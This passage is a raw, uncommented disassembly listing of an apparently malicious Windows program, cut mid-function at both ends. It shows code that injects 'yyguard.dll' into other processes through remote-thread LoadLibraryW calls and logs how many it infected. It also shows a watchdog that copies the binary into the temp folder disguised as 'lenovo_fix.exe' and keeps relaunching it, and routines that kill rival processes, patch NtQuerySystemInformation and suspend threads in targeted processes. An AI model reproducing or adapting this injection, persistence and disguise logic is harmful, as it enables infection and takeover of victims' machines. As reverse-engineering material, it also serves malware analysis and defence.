jz      loc_1400031A7
xor     r15d, r15d
cmp     cs:off_140009280, r15 ; "System"
jz      loc_140003099
nop     dword ptr [rax]

loc_140003010:
movsxd  rbx, r15d
mov     rbx, [rdi+rbx*8]
test    rbx, rbx
jz      short loc_140003084
lea     r14, [rbp+660h+pe.szExeFile]
cmp     [rbp+660h+pe.szExeFile], 0
jz      short loc_14000306A

loc_140003027:
cmp     word ptr [rbx], 0
jz      short loc_140003063
movzx   edi, word ptr [r14]
movzx   ecx, word ptr [rbx] ; C
call    cs:towupper
movzx   esi, ax
movzx   ecx, di         ; C
call    cs:towupper
cmp     ax, si
jnz     short loc_14000307D
add     r14, 2
add     rbx, 2
cmp     word ptr [r14], 0
jnz     short loc_140003027
lea     rdi, off_140009280 ; "System"
jmp     short loc_140003071

loc_140003063:
lea     rdi, off_140009280 ; "System"

loc_14000306A:
cmp     word ptr [r14], 0
jnz     short loc_140003084

loc_140003071:
cmp     word ptr [rbx], 0
jz      loc_1400031A7
jmp     short loc_140003084

loc_14000307D:
lea     rdi, off_140009280 ; "System"

loc_140003084:
inc     r15d
movsxd  rax, r15d
cmp     qword ptr [rdi+rax*8], 0
jnz     loc_140003010
mov     r8d, [rbp+660h+pe.th32ProcessID] ; dwProcessId

loc_140003099:          ; bInheritHandle
xor     edx, edx
mov     ecx, 42Ah       ; dwDesiredAccess
call    cs:OpenProcess
mov     rbx, rax
test    rax, rax
jz      loc_1400031A7
lea     rcx, [rbp+660h+Destination] ; lpString
call    cs:lstrlenW
inc     eax
movsxd  rcx, eax
lea     rdi, [rcx+rcx]
mov     [rsp+760h+flProtect], 4 ; flProtect
mov     r9d, 1000h      ; flAllocationType
mov     r8, rdi         ; dwSize
xor     edx, edx        ; lpAddress
mov     rcx, rbx        ; hProcess
call    cs:VirtualAllocEx
mov     rsi, rax
xor     r14b, r14b
test    rax, rax
jz      loc_140003196
mov     qword ptr [rsp+760h+flProtect], 0 ; lpNumberOfBytesWritten
mov     r9, rdi         ; nSize
lea     r8, [rbp+660h+Destination] ; lpBuffer
mov     rdx, rax        ; lpBaseAddress
mov     rcx, rbx        ; hProcess
call    cs:WriteProcessMemory
test    eax, eax
jz      short loc_140003181
lea     rcx, aKernel32Dll_0 ; "kernel32.dll"
call    cs:GetModuleHandleA
mov     rcx, rax        ; hModule
lea     rdx, aLoadlibraryw ; "LoadLibraryW"
call    cs:GetProcAddress
test    rax, rax
jz      short loc_140003181
mov     [rsp+760h+lpThreadId], 0 ; lpThreadId
mov     [rsp+760h+dwCreationFlags], 0 ; dwCreationFlags
mov     qword ptr [rsp+760h+flProtect], rsi ; int
mov     r9, rax         ; lpStartAddress
xor     r8d, r8d        ; dwStackSize
xor     edx, edx        ; lpThreadAttributes
mov     rcx, rbx        ; hProcess
call    cs:CreateRemoteThread
mov     rdi, rax
test    rax, rax
jz      short loc_140003181
mov     edx, 7D0h       ; dwMilliseconds
mov     rcx, rax        ; hHandle
call    cs:WaitForSingleObject
mov     rcx, rdi        ; hObject
call    cs:CloseHandle
mov     r14b, 1

loc_140003181:          ; dwFreeType
mov     r9d, 8000h
xor     r8d, r8d        ; dwSize
mov     rdx, rsi        ; lpAddress
mov     rcx, rbx        ; hProcess
call    cs:VirtualFreeEx

loc_140003196:          ; hObject
mov     rcx, rbx
call    cs:CloseHandle
test    r14b, r14b
jz      short loc_1400031A7
inc     r12d

loc_1400031A7:          ; lppe
lea     rdx, [rbp+660h+pe]
mov     rcx, r13        ; hSnapshot
call    cs:Process32NextW
test    eax, eax
lea     rdi, off_140009280 ; "System"
jnz     loc_140002FE0
mov     ebx, [rsp+760h+var_720]
lea     rsi, aSpreadYyguardD ; "Spread: yyguard.dll injected into "
lea     r14, aSpreadYyguardD+22h ; ""

loc_1400031D5:          ; hObject
mov     rcx, r13
call    cs:CloseHandle

loc_1400031DE:
inc     ebx
mov     [rsp+760h+var_720], ebx
mov     eax, 66666667h
imul    ebx
sar     edx, 1
mov     eax, edx
shr     eax, 1Fh
add     edx, eax
lea     ecx, [rdx+rdx*4]
cmp     ebx, ecx
jnz     loc_14000347B
mov     edx, r12d
lea     rcx, [rbp+660h+Src] ; void *
call    sub_140004F60
nop
mov     r8, [rbp+660h+var_6C8]
mov     rcx, [rbp+660h+var_6C0]
mov     rax, rcx
sub     rax, r8
cmp     rax, 22h ; '"'
jb      short loc_140003298
lea     rax, [r8+22h]
mov     [rbp+660h+var_6C8], rax
lea     rbx, [rbp+660h+Src]
cmp     rcx, 0Fh
cmova   rbx, [rbp+660h+Src]
cmp     r14, rbx
jbe     short loc_140003254
lea     rax, [rbx+r8]
cmp     rsi, rax
ja      short loc_140003254
cmp     rbx, rsi
ja      short loc_14000324C
xor     edi, edi
jmp     short loc_140003259

loc_14000324C:
mov     rdi, rbx
sub     rdi, rsi
jmp     short loc_140003259

loc_140003254:
mov     edi, 22h ; '"'

loc_140003259:          ; Size
inc     r8
lea     rcx, [rbx+22h]  ; void *
mov     rdx, rbx        ; Src
call    memmove
mov     r8, rdi         ; Size
mov     rdx, rsi        ; Src
mov     rcx, rbx        ; void *
call    memcpy
mov     r8d, 22h ; '"'
sub     r8, rdi         ; Size
lea     rdx, aSpreadYyguardD+22h ; ""
add     rdx, rdi        ; Src
lea     rcx, [rdi+rbx]  ; void *
call    memcpy
lea     rax, [rbp+660h+Src]
jmp     short loc_1400032AF

loc_140003298:          ; Size
mov     qword ptr [rsp+760h+dwCreationFlags], 22h ; '"'
mov     edx, 22h ; '"'
lea     rcx, [rbp+660h+Src] ; Src
call    sub_140005F50

loc_1400032AF:
xorps   xmm0, xmm0
movups  [rsp+760h+var_718], xmm0
mov     qword ptr [rsp+760h+var_708], 0
mov     qword ptr [rsp+760h+var_708+8], 0
movups  xmm0, xmmword ptr [rax]
movups  [rsp+760h+var_718], xmm0
movups  xmm1, xmmword ptr [rax+10h]
movups  [rsp+760h+var_708], xmm1
mov     qword ptr [rax+10h], 0
mov     qword ptr [rax+18h], 0Fh
mov     byte ptr [rax], 0
mov     rcx, qword ptr [rsp+760h+var_708]
mov     rdx, qword ptr [rsp+760h+var_708+8]
mov     rax, rdx
sub     rax, rcx
cmp     rax, 7
jb      short loc_14000333E
lea     rax, [rcx+7]
mov     qword ptr [rsp+760h+var_708], rax
lea     rbx, [rsp+760h+var_718]
cmp     rdx, 0Fh
cmova   rbx, qword ptr [rsp+760h+var_718]
add     rbx, rcx
mov     r8d, 7          ; Size
lea     rdx, aProcs     ; " procs."
mov     rcx, rbx        ; void *
call    memmove
mov     byte ptr [rbx+7], 0
lea     rax, [rsp+760h+var_718]
jmp     short loc_140003356

loc_14000333E:          ; Size
mov     qword ptr [rsp+760h+flProtect], 7
mov     edx, 7
lea     rcx, [rsp+760h+var_718] ; Src
call    sub_140005D90

loc_140003356:
xorps   xmm0, xmm0
movups  [rsp+760h+var_6F8], xmm0
mov     qword ptr [rsp+760h+var_6E8], 0
mov     qword ptr [rbp+660h+var_6E8+8], 0
movups  xmm0, xmmword ptr [rax]
movups  [rsp+760h+var_6F8], xmm0
movups  xmm1, xmmword ptr [rax+10h]
movups  [rsp+760h+var_6E8], xmm1
mov     qword ptr [rax+10h], 0
mov     qword ptr [rax+18h], 0Fh
mov     byte ptr [rax], 0
lea     rcx, [rsp+760h+var_6F8]
call    sub_140001780
nop
mov     rdx, qword ptr [rbp+660h+var_6E8+8]
cmp     rdx, 0Fh
jbe     short loc_1400033DA
inc     rdx
mov     rcx, qword ptr [rsp+760h+var_6F8]
cmp     rdx, 1000h
jb      short loc_1400033D5
mov     rax, [rcx-8]
sub     rcx, rax
sub     rcx, 8
cmp     rcx, 1Fh
ja      loc_14000348B
add     rdx, 27h ; '''
mov     rcx, rax        ; Block

loc_1400033D5:
call    j_j_free

loc_1400033DA:
mov     qword ptr [rsp+760h+var_6E8], 0
mov     qword ptr [rbp+660h+var_6E8+8], 0Fh
mov     byte ptr [rsp+760h+var_6F8], 0
mov     rdx, qword ptr [rsp+760h+var_708+8]
cmp     rdx, 0Fh
jbe     short loc_140003429
inc     rdx
mov     rcx, qword ptr [rsp+760h+var_718]
cmp     rdx, 1000h
jb      short loc_140003424
mov     rax, [rcx-8]
sub     rcx, rax
sub     rcx, 8
cmp     rcx, 1Fh
ja      short loc_140003492
add     rdx, 27h ; '''
mov     rcx, rax        ; Block

loc_140003424:
call    j_j_free

loc_140003429:
mov     qword ptr [rsp+760h+var_708], 0
mov     qword ptr [rsp+760h+var_708+8], 0Fh
mov     byte ptr [rsp+760h+var_718], 0
mov     rdx, [rbp+660h+var_6C0]
cmp     rdx, 0Fh
jbe     short loc_140003477
inc     rdx
mov     rcx, [rbp+660h+Src]
cmp     rdx, 1000h
jb      short loc_140003472
mov     rax, [rcx-8]
sub     rcx, rax
sub     rcx, 8
cmp     rcx, 1Fh
ja      short loc_140003499
add     rdx, 27h ; '''
mov     rcx, rax        ; Block

loc_140003472:
call    j_j_free

loc_140003477:
mov     ebx, [rsp+760h+var_720]

loc_14000347B:          ; dwMilliseconds
mov     ecx, 7D0h
call    cs:Sleep
jmp     loc_140002F8A

loc_14000348B:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_140003492:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_140003499:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)
; } // starts at 140002EE0
sub_140002EE0 endp



; Attributes: bp-based frame fpd=6B0h

; DWORD __stdcall sub_1400034A0(LPVOID lpThreadParameter)
sub_1400034A0 proc near

bInheritHandles= dword ptr -790h
dwCreationFlags= dword ptr -788h
lpEnvironment= qword ptr -780h
lpCurrentDirectory= qword ptr -778h
lpStartupInfo= qword ptr -770h
lpProcessInformation= qword ptr -768h
var_760= xmmword ptr -760h
var_750= qword ptr -750h
var_748= qword ptr -748h
ProcessInformation= _PROCESS_INFORMATION ptr -740h
StartupInfo= _STARTUPINFOW ptr -720h
pe= PROCESSENTRY32W ptr -6B0h
Buffer= word ptr -470h
Filename= word ptr -260h
var_50= qword ptr -50h

; __unwind { // sub_140007150
push    rbp
push    rbx
push    rsi
push    rdi
push    r12
push    r13
push    r14
push    r15
lea     rbp, [rsp-678h]
sub     rsp, 778h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rbp+6B0h+var_50], rax
call    sub_140002DF0
mov     r8d, 104h       ; nSize
lea     rdx, [rbp+6B0h+Filename] ; lpFilename
xor     ecx, ecx        ; hModule
call    cs:GetModuleFileNameW
xor     edx, edx        ; Val
mov     r8d, 208h       ; Size
lea     rcx, [rbp+6B0h+Buffer] ; void *
call    memset
lea     rdx, [rbp+6B0h+Buffer] ; lpBuffer
mov     ecx, 104h       ; nBufferLength
call    cs:GetTempPathW
dec     eax
cmp     eax, 0EEh
ja      loc_140003773
lea     rdx, String2    ; "lenovo_fix.exe"
lea     rcx, [rbp+6B0h+Buffer] ; lpString1
call    cs:lstrcatW
xor     r8d, r8d        ; bFailIfExists
lea     rdx, [rbp+6B0h+Buffer] ; lpNewFileName
lea     rcx, [rbp+6B0h+Filename] ; lpExistingFileName
call    cs:CopyFileW
xor     r13d, r13d
nop     dword ptr [rax+rax+00000000h]

loc_140003550:          ; th32ProcessID
xor     edx, edx
mov     ecx, 2          ; dwFlags
call    cs:CreateToolhelp32Snapshot
mov     r15, rax
cmp     rax, 0FFFFFFFFFFFFFFFFh
jz      loc_14000361C
xor     r12b, r12b
mov     [rbp+6B0h+pe.dwSize], 238h
xor     edx, edx        ; Val
mov     r8d, 234h       ; Size
lea     rcx, [rbp+6B0h+pe.cntUsage] ; void *
call    memset
lea     rdx, [rbp+6B0h+pe] ; lppe
mov     rcx, r15        ; hSnapshot
call    cs:Process32FirstW
test    eax, eax
jz      short loc_14000360A
db      66h, 66h
nop     word ptr [rax+rax+00000000h]

loc_1400035A0:
lea     rbx, String2    ; "lenovo_fix.exe"
lea     r14, [rbp+6B0h+pe.szExeFile]
cmp     [rbp+6B0h+pe.szExeFile], 0
jz      short loc_1400035E7

loc_1400035B2:
cmp     word ptr [rbx], 0
jz      short loc_1400035E7
movzx   edi, word ptr [r14]
movzx   ecx, word ptr [rbx] ; C
call    cs:towupper
movzx   esi, ax
movzx   ecx, di         ; C
call    cs:towupper
cmp     ax, si
jnz     short loc_1400035F4
add     r14, 2
add     rbx, 2
cmp     word ptr [r14], 0
jnz     short loc_1400035B2
jmp     short loc_1400035EE

loc_1400035E7:
cmp     word ptr [r14], 0
jnz     short loc_1400035F4

loc_1400035EE:
cmp     word ptr [rbx], 0
jz      short loc_140003607

loc_1400035F4:          ; lppe
lea     rdx, [rbp+6B0h+pe]
mov     rcx, r15        ; hSnapshot
call    cs:Process32NextW
test    eax, eax
jnz     short loc_1400035A0
jmp     short loc_14000360A

loc_140003607:
mov     r12b, 1

loc_14000360A:          ; hObject
mov     rcx, r15
call    cs:CloseHandle
test    r12b, r12b
jnz     loc_14000375C

loc_14000361C:
mov     [rbp+6B0h+StartupInfo.cb], 68h ; 'h'
xorps   xmm0, xmm0
movups  xmmword ptr [rbp+6B0h+StartupInfo.lpReserved], xmm0
movups  xmmword ptr [rbp+6B0h+StartupInfo.lpTitle], xmm0
movups  xmmword ptr [rbp+6B0h+StartupInfo.dwXSize], xmm0
movups  xmmword ptr [rbp+6B0h+StartupInfo.dwFillAttribute], xmm0
movups  xmmword ptr [rbp+6B0h+StartupInfo.lpReserved2], xmm0
movups  xmmword ptr [rbp+6B0h+StartupInfo.hStdOutput], xmm0
xor     edx, edx        ; Val
mov     r8d, 212h       ; Size
lea     rcx, [rbp+6B0h+pe] ; void *
call    memset
lea     r8, [rbp+6B0h+Buffer]
lea     rdx, aS         ; "\"%s\""
lea     rcx, [rbp+6B0h+pe] ; LPWSTR
call    cs:wsprintfW
lea     rax, [rsp+7B0h+ProcessInformation]
mov     [rsp+7B0h+lpProcessInformation], rax ; lpProcessInformation
lea     rax, [rbp+6B0h+StartupInfo]
mov     [rsp+7B0h+lpStartupInfo], rax ; lpStartupInfo
mov     [rsp+7B0h+lpCurrentDirectory], r13 ; lpCurrentDirectory
mov     [rsp+7B0h+lpEnvironment], r13 ; lpEnvironment
mov     [rsp+7B0h+dwCreationFlags], 8000000h ; dwCreationFlags
mov     [rsp+7B0h+bInheritHandles], r13d ; bInheritHandles
xor     r9d, r9d        ; lpThreadAttributes
xor     r8d, r8d        ; lpProcessAttributes
lea     rdx, [rbp+6B0h+pe] ; lpCommandLine
xor     ecx, ecx        ; lpApplicationName
call    cs:CreateProcessW
test    eax, eax
jz      loc_14000375C
mov     rcx, [rsp+7B0h+ProcessInformation.hProcess] ; hObject
call    cs:CloseHandle
mov     rcx, [rsp+7B0h+ProcessInformation.hThread] ; hObject
call    cs:CloseHandle
xorps   xmm0, xmm0
movups  [rsp+7B0h+var_760], xmm0
mov     [rsp+7B0h+var_750], r13
mov     [rsp+7B0h+var_748], r13
mov     ecx, 40h ; '@'  ; Size
call    sub_1400062C0
mov     qword ptr [rsp+7B0h+var_760], rax
mov     [rsp+7B0h+var_750], 30h ; '0'
mov     [rsp+7B0h+var_748], 3Fh ; '?'
movups  xmm0, cs:xmmword_140008FB8
movups  xmmword ptr [rax], xmm0
movups  xmm1, cs:xmmword_140008FC8
movups  xmmword ptr [rax+10h], xmm1
movups  xmm0, cs:xmmword_140008FD8
movups  xmmword ptr [rax+20h], xmm0
mov     byte ptr [rax+30h], 0
lea     rcx, [rsp+7B0h+var_760]
call    sub_140001780
nop
mov     rdx, [rsp+7B0h+var_748]
cmp     rdx, 0Fh
jbe     short loc_14000375C
inc     rdx
mov     rcx, qword ptr [rsp+7B0h+var_760]
cmp     rdx, 1000h
jb      short loc_140003757
mov     rax, [rcx-8]
sub     rcx, rax
sub     rcx, 8
cmp     rcx, 1Fh
ja      short loc_14000376C
add     rdx, 27h ; '''
mov     rcx, rax        ; Block

loc_140003757:
call    j_j_free

loc_14000375C:          ; dwMilliseconds
mov     ecx, 7D0h
call    cs:Sleep
jmp     loc_140003550

loc_14000376C:
mov     ecx, 5
int     29h             ; Win8: RtlFailFast(ecx)

loc_140003773:
xor     eax, eax
mov     rcx, [rbp+6B0h+var_50]
xor     rcx, rsp        ; StackCookie
call    __security_check_cookie
add     rsp, 778h
pop     r15
pop     r14
pop     r13
pop     r12
pop     rdi
pop     rsi
pop     rbx
pop     rbp
retn
; } // starts at 1400034A0
sub_1400034A0 endp

algn_140003798:
align 20h



; BOOL __stdcall EnumFunc(HWND, LPARAM)
EnumFunc proc near

ClassName= word ptr -118h
var_18= qword ptr -18h
arg_10= qword ptr  18h

; __unwind { // __GSHandlerCheck
mov     [rsp+arg_10], rbx
push    rdi
sub     rsp, 130h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rsp+138h+var_18], rax
mov     rdi, rdx
mov     rbx, rcx
call    cs:IsWindowVisible
test    eax, eax
jz      short loc_14000381C
xor     edx, edx        ; Val
lea     rcx, [rsp+138h+ClassName] ; void *
mov     r8d, 100h       ; Size
call    memset
mov     r8d, 80h        ; nMaxCount
lea     rdx, [rsp+138h+ClassName] ; lpClassName
mov     rcx, rbx        ; hWnd
call    cs:GetClassNameW
lea     rdx, aXxAliveWnd ; "XX_ALIVE_WND_"
lea     rcx, [rsp+138h+ClassName] ; Str
call    cs:wcsstr
test    rax, rax
jz      short loc_14000381C
mov     rdx, rdi        ; lpdwProcessId
mov     rcx, rbx        ; hWnd
call    cs:GetWindowThreadProcessId
xor     eax, eax
jmp     short loc_140003821

loc_14000381C:
mov     eax, 1

loc_140003821:
mov     rcx, [rsp+138h+var_18]
xor     rcx, rsp        ; StackCookie
call    __security_check_cookie
mov     rbx, [rsp+138h+arg_10]
add     rsp, 130h
pop     rdi
retn
; } // starts at 1400037A0
EnumFunc endp

algn_140003842:
align 10h


; Attributes: noreturn bp-based frame fpd=0AE0h

; DWORD __stdcall sub_140003850(LPVOID lpThreadParameter)
sub_140003850 proc near

var_BC0= byte ptr -0BC0h
var_BB8= qword ptr -0BB8h
var_BB0= qword ptr -0BB0h
var_BA8= qword ptr -0BA8h
te= THREADENTRY32 ptr -0BA0h
pe= PROCESSENTRY32W ptr -0B80h
lParam= qword ptr -940h
me= MODULEENTRY32W ptr -930h
var_4F0= xmmword ptr -4F0h
var_4E0= xmmword ptr -4E0h
var_4D0= xmmword ptr -4D0h
var_4C0= xmmword ptr -4C0h
var_4B0= xmmword ptr -4B0h
var_4A0= xmmword ptr -4A0h
var_490= xmmword ptr -490h
var_480= xmmword ptr -480h
Destination= word ptr -470h
ExeName= word ptr -260h
var_50= qword ptr -50h

; __unwind { // sub_140007150
push    rbp
push    rbx
push    rsi
push    rdi
push    r12
push    r13
push    r14
push    r15
lea     rbp, [rsp-0AA8h]
sub     rsp, 0BA8h
mov     rax, cs:__security_cookie
xor     rax, rsp
mov     [rbp+0AE0h+var_50], rax
call    sub_140002DF0
lea     rcx, ModuleName ; "ntdll.dll"
call    cs:GetModuleHandleA
mov     rbx, rax
test    rax, rax
jz      short loc_1400038C5
lea     rdx, aNtsuspendproce ; "NtSuspendProcess"
mov     rcx, rax        ; hModule
call    cs:GetProcAddress
mov     cs:qword_14000C548, rax
lea     rdx, aNtsuspendthrea ; "NtSuspendThread"
mov     rcx, rbx        ; hModule
call    cs:GetProcAddress
mov     cs:qword_14000C4F0, rax

loc_1400038C5:
lea     rdx, aNtquerysystemi ; "NtQuerySystemInformation"
mov     rcx, rbx        ; hModule
call    cs:GetProcAddress
mov     rbx, rax
mov     [rsp+0BE0h+var_BA8], rax
xor     edi, edi
mov     [rsp+0BE0h+var_BB0], rdi
movzx   esi, dil
mov     [rsp+0BE0h+var_BC0], dil
test    rax, rax
jz      short loc_140003902
mov     edi, [rax]
mov     [rsp+0BE0h+var_BB0], rdi
movzx   esi, byte ptr [rax+4]
mov     [rsp+0BE0h+var_BC0], sil

loc_140003902:
mov     r12d, 1

loc_140003908:
test    rbx, rbx
jz      short loc_14000394E
lea     r9, [rbp+0AE0h+lParam+4] ; lpflOldProtect
mov     edx, 5          ; dwSize
mov     r8d, 40h ; '@'  ; flNewProtect
mov     rcx, rbx        ; lpAddress
call    cs:VirtualProtect
test    eax, eax
jz      short loc_14000394E
mov     [rbx], edi
mov     [rbx+4], sil
lea     r9, [rbp+0AE0h+lParam+4] ; lpflOldProtect
mov     r8d, dword ptr [rbp+0AE0h+lParam+4] ; flNewProtect
mov     edx, 5          ; dwSize
mov     rcx, rbx        ; lpAddress
call    cs:VirtualProtect

loc_14000394E:
mov     dword ptr [rbp+0AE0h+lParam], 0
lea     rdx, [rbp+0AE0h+lParam] ; lParam
lea     rcx, EnumFunc   ; lpEnumFunc
call    cs:EnumWindows
cmp     dword ptr [rbp+0AE0h+lParam], 0
jz      short loc_1400039AE
call    cs:GetCurrentProcessId
mov     r8d, dword ptr [rbp+0AE0h+lParam] ; dwProcessId
cmp     r8d, eax
jz      short loc_1400039AE
xor     edx, edx        ; bInheritHandle
mov     ecx, r12d       ; dwDesiredAccess
call    cs:OpenProcess
mov     rbx, rax
test    rax, rax
jz      short loc_1400039AE
xor     edx, edx        ; uExitCode
mov     rcx, rax        ; hProcess
call    cs:TerminateProcess
mov     rcx, rbx        ; hObject
call    cs:CloseHandle

loc_1400039AE:          ; th32ProcessID
xor     edx, edx
mov     ecx, 2          ; dwFlags
call    cs:CreateToolhelp32Snapshot
mov     r15, rax
mov     [rsp+0BE0h+var_BB8], rax
cmp     rax, 0FFFFFFFFFFFFFFFFh
jz      loc_140003CAA
mov     [rsp+0BE0h+pe.dwSize], 238h
xor     edx, edx        ; Val
mov     r8d, 234h       ; Size
lea     rcx, [rsp+0BE0h+pe.cntUsage] ; void *
call    memset
lea     rdx, [rsp+0BE0h+pe] ; lppe
mov     rcx, r15        ; hSnapshot
call    cs:Process32FirstW
test    eax, eax
jz      loc_140003CA1
nop     dword ptr [rax]

loc_140003A00:
cmp     [rsp+0BE0h+pe.th32ProcessID], 4
jbe     loc_140003C8B
lea     r14, String2    ; "lenovo_fix.exe"
lea     rsi, [rbp+0AE0h+pe.szExeFile]
cmp     [rbp+0AE0h+pe.szExeFile], 0
jz      short loc_140003A53
nop     dword ptr [rax]

loc_140003A20:          ; C
movzx   ecx, word ptr [r14]
test    cx, cx
jz      short loc_140003A53
movzx   ebx, word ptr [rsi]
call    cs:towupper
movzx   edi, ax
movzx   ecx, bx         ; C
call    cs:towupper
cmp     ax, di
jnz     short loc_140003A64
add     rsi, 2
add     r14, 2
cmp     word ptr [rsi], 0
jnz     short loc_140003A20
jmp     short loc_140003A59

loc_140003A53:
cmp     word ptr [rsi], 0
jnz     short loc_140003A64

loc_140003A59:
cmp     word ptr [r14], 0
jz      loc_140003C8B

loc_140003A64:
xorps   xmm0, xmm0
movups  [rbp+0AE0h+var_4F0], xmm0
movups  [rbp+0AE0h+var_4E0], xmm0
movups  [rbp+0AE0h+var_4D0], xmm0
movups  [rbp+0AE0h+var_4C0], xmm0
movups  [rbp+0AE0h+var_4B0], xmm0
movups  [rbp+0AE0h+var_4A0], xmm0
movups  [rbp+0AE0h+var_490], xmm0
movups  [rbp+0AE0h+var_480], xmm0
xor     ecx, ecx
lea     rdx, [rbp+0AE0h+pe.szExeFile]
cmp     [rbp+0AE0h+pe.szExeFile], cx
jz      short loc_140003AD8
nop     dword ptr [rax+rax+00h]

loc_140003AB0:
movzx   r8d, word ptr [rdx]
cmp     r8w, 2Eh ; '.'
jz      short loc_140003AD8
cmp     ecx, 3Fh ; '?'
jge     short loc_140003AD8
movsxd  rax, ecx
mov     word ptr [rbp+rax*2+0AE0h+var_4F0], r8w
add     rdx, 2
inc     ecx
cmp     word ptr [rdx], 0
jnz     short loc_140003AB0

loc_140003AD8:
movsxd  rax, ecx
lea     rcx, [rax+rax]
cmp     rcx, 80h
jnb     loc_1400045D0
xor     eax, eax
mov     word ptr [rbp+rcx+0AE0h+var_4F0], ax
lea     rsi, aXx        ; "xx"
lea     rdi, [rbp+0AE0h+var_4F0]
cmp     word ptr [rbp+0AE0h+var_4F0], ax
jz      short loc_140003B3F
nop     dword ptr [rax]

loc_140003B10:          ; C
movzx   ecx, word ptr [rsi]
test    cx, cx
jz      short loc_140003B3F
call    cs:towupper
movzx   ebx, ax
movzx   ecx, word ptr [rdi] ; C
call    cs:towupper
cmp     ax, bx
jnz     short loc_140003B50
add     rdi, 2
add     rsi, 2
cmp     word ptr [rdi], 0
jnz     short loc_140003B10
jmp     short loc_140003B45

loc_140003B3F:
cmp     word ptr [rdi], 0
jnz     short loc_140003B50

loc_140003B45:
cmp     word ptr [rsi], 0
jnz     short loc_140003B50
mov     r13b, 1
jmp     short loc_140003B53

loc_140003B50:
xor     r13b, r13b

loc_140003B53:
xor     esi, esi
lock xadd cs:dword_14000C4E8, esi
mov     dword ptr [rbp+0AE0h+lParam], esi
xor     cl, cl
mov     ebx, [rsp+0BE0h+pe.th32ProcessID]
test    esi, esi
jz      short loc_140003B78
xor     al, al
movzx   ecx, al
cmp     ebx, esi
cmovz   ecx, r12d

loc_140003B78:
movzx   eax, r13b
or      al, cl
jnz     loc_140003CE7
mov     edx, ebx        ; th32ProcessID
mov     ecx, 8          ; dwFlags
call    cs:CreateToolhelp32Snapshot
mov     r12, rax
cmp     rax, 0FFFFFFFFFFFFFFFFh
jz      loc_140003C85
mov     [rbp+0AE0h+me.dwSize], 438h
xor     edx, edx        ; Val
mov     r8d, 434h       ; Size
lea     rcx, [rbp+0AE0h+me.th32ModuleID] ; void *
call    memset
lea     rdx, [rbp+0AE0h+me] ; lpme
mov     rcx, r12        ; hSnapshot
call    cs:Module32FirstW
test    eax, eax
jz      loc_140003C7C
nop     dword ptr [rax+00h]
nop     dword ptr [rax+rax+00000000h]

loc_140003BE0:
xor     r15d, r15d
nop     dword ptr [rax+00h]
nop     word ptr [rax+rax+00000000h]

loc_140003BF0:
lea     rax, lpString2
mov     rbx, [rax+r15*8]
test    rbx, rbx
jz      short loc_140003C56
lea     rsi, [rbp+0AE0h+me.szModule]
movzx   r14d, [rbp+0AE0h+me.szModule]
test    r14w, r14w
jz      short loc_140003C50

loc_140003C15:
movzx   r14d, word ptr [rsi]
cmp     word ptr [rbx], 0
jz      short loc_140003C4A
movzx   ecx, word ptr [rbx] ; C
call    cs:towupper
movzx   edi, ax
movzx   ecx, r14w       ; C
call    cs:towupper
cmp     ax, di
jnz     short loc_140003C56
add     rsi, 2
add     rbx, 2
cmp     word ptr [rsi], 0
jnz     short loc_140003C15
jmp     short loc_140003C50

loc_140003C4A:
test    r14w, r14w
jnz     short loc_140003C56

loc_140003C50:
cmp     word ptr [rbx], 0
jz      short loc_140003CC9

loc_140003C56:
inc     r15d
cmp     r15d, 7
jl      short loc_140003BF0
lea     rdx, [rbp+0AE0h+me] ; lpme
mov     rcx, r12        ; hSnapshot
call    cs:Module32NextW
test    eax, eax
jnz     loc_140003BE0
mov     r15, [rsp+0BE0h+var_BB8]

loc_140003C7C:          ; hObject
mov     rcx, r12
call    cs:CloseHandle

loc_140003C85:
mov     r12d, 1

loc_140003C8B:          ; lppe
lea     rdx, [rsp+0BE0h+pe]
mov     rcx, r15        ; hSnapshot
call    cs:Process32NextW
test    eax, eax
jnz     loc_140003A00

loc_140003CA1:          ; hObject
mov     rcx, r15
call    cs:CloseHandle

loc_140003CAA:          ; dwMilliseconds
mov     ecx, 78h ; 'x'
call    cs:Sleep
mov     rbx, [rsp+0BE0h+var_BA8]
mov     rdi, [rsp+0BE0h+var_BB0]
movzx   esi, [rsp+0BE0h+var_BC0]
jmp     loc_140003908

loc_140003CC9:          ; hObject
mov     rcx, r12
call    cs:CloseHandle
mov     ebx, [rsp+0BE0h+pe.th32ProcessID]
mov     esi, dword ptr [rbp+0AE0h+lParam]
mov     r15, [rsp+0BE0h+var_BB8]
mov     r12d, 1

loc_140003CE7:          ; Val
xor     edx, edx
mov     r8d, 208h       ; Size
lea     rcx, [rbp+0AE0h+ExeName] ; void *
call    memset
mov     r8d, ebx        ; dwProcessId
xor     edx, edx        ; bInheritHandle
mov     ecx, 1000h      ; dwDesiredAccess
call    cs:OpenProcess
mov     rbx, rax
test    rax, rax
jz      short loc_140003D3F
mov     dword ptr [rbp+0AE0h+lParam], 104h
lea     r9, [rbp+0AE0h+lParam] ; lpdwSize
lea     r8, [rbp+0AE0h+ExeName] ; lpExeName
xor     edx, edx        ; dwFlags
mov     rcx, rax        ; hProcess
call    cs:QueryFullProcessImageNameW
mov     rcx, rbx        ; hObject
call    cs:CloseHandle

loc_140003D3F:          ; th32ProcessID
xor     edx, edx
mov     ecx, 4          ; dwFlags
call    cs:CreateToolhelp32Snapshot
mov     rdi, rax
cmp     rax, 0FFFFFFFFFFFFFFFFh
jz      loc_140003DE5
mov     [rsp+0BE0h+te.dwSize], 1Ch
xorps   xmm0, xmm0
xor     eax, eax
movups  xmmword ptr [rsp+0BE0h+te.cntUsage], xmm0
mov     qword ptr [rsp+0BE0h+te.tpDeltaPri], rax
lea     rdx, [rsp+0BE0h+te] ; lpte
mov     rcx, rdi        ; hSnapshot
call    cs:Thread32First
test    eax, eax
jz      short loc_140003DDC

loc_140003D82:
mov     eax, [rsp+0BE0h+pe.th32ProcessID]
cmp     [rsp+0BE0h+te.th32OwnerProcessID], eax
jnz     short loc_140003DCA
mov     r8d, [rsp+0BE0h+te.th32ThreadID] ; dwThreadId
xor     edx, edx        ; bInheritHandle
mov     ecx, 2          ; dwDesiredAccess
call    cs:OpenThread
mov     rbx, rax
test    rax, rax
jz      short loc_140003DCA
mov     rax, cs:qword_14000C4F0
mov     rcx, rbx        ; hThread
test    rax, rax
jz      short loc_140003DBB
xor     edx, edx
call    rax ; qword_14000C4F0
jmp     short loc_140003DC1

loc_140003DBB:
